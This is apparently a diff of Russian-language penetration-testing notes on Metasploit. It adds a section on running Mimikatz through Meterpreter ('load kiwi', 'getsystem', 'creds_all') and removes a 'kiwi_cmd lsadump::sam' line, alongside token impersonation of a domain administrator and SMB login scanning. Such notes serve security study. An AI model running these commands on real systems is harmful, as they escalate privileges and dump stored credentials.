@@ -13,6 +13,14 @@ searchsploit desctop control   поиск эксплойта для назван
    
      impersonate_token DC\\Administrator
    
+# МИМИКАТЗ в метасплойт
+
+   load kiwi
+
+   getsystem
+
+   creds_all
+
 # использование эксплйтов ядра
 Kali VM
 
@@ -120,11 +128,9 @@ use auxiliary/scanner/smb/smb_login
 set rhost
 set 
 
-# МИМИКАТЗ в метасплойт
+   
 
-kiwi_cmd lsadump::sam
-
-Поиск уязвимостей ядра
+# Поиск уязвимостей ядра
 
 (в метерпретер-сессии)
 
